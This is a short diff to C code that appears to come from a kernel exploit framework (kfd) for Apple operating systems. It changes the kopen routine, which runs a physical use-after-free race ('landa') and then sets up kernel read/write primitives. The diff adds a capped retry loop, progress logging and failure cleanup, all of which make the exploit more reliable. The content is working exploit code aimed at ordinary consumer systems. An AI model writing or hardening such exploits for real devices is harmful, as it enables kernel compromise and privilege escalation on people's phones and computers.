@@ -183,16 +183,27 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     assert(kwrite_method <= kwrite_IOSurface);
 
     struct kfd* kfd = NULL;
+    u64 attempts = 0;
+    const u64 max_attempts = 3;
     
 retry:
+    attempts++;
+    printf("[ke] kfd: kopen attempt %llu/%llu (puaf=%u pages)\n", attempts, max_attempts, puaf_pages);
     kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
+    printf("[ke] kfd: puaf_run (landa race) starting\n");
     puaf_run(kfd);
+    printf("[ke] kfd: puaf_run done, krkw_run (grab + spray) starting\n");
     if(krkw_run(kfd) == false) {
-        if(puaf_method == puaf_landa) {
+        if(puaf_method == puaf_landa && attempts < max_attempts) {
             kfd->puaf.puaf_method_ops.deallocate(kfd);
             puaf_free(kfd);
             kfd = NULL;
             goto retry;
+        }
+        if (puaf_method == puaf_landa) {
+            kfd->puaf.puaf_method_ops.deallocate(kfd);
+            puaf_free(kfd);
+            return 0;
         }
     }
     info_run(kfd);
